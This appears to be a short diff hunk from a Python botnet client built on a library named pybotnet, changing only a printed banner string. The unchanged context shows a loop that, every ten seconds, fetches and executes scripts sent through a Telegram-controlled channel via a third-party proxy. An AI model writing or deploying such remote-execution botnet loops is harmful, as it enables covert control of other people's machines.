@@ -16,6 +16,6 @@ bot = pybotnet.PyBotNet(TELEGRAM_TOKEN, ADMIN_CHAT_ID,
 delay = 10
 
 while True:
-    print('*'*100)
+    print('*-*'*15)
     bot.get_and_execute_scripts_by_third_party_proxy()
     time.sleep(delay)
